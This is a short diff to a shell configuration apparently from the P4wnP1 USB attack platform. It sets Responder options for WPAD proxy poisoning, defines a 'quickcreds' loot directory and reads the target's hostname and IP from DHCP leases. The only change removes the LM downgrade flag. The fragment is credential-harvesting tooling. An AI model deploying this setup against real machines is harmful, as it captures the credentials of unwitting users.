@@ -11,7 +11,7 @@
 # Option number: 252 Option string: http://172.16.0.1/wpad.dat
 
 
-RESPONDER_OPTIONS=" -w -F -P -v --upstream-proxy=UPSTREAM_PROXY --lm"
+RESPONDER_OPTIONS=" -w -F -P -v --upstream-proxy=UPSTREAM_PROXY"
 LOOTDIR=/usr/local/P4wnP1/www/loot/quickcreds
 TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);
 TARGET_IP=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f3);
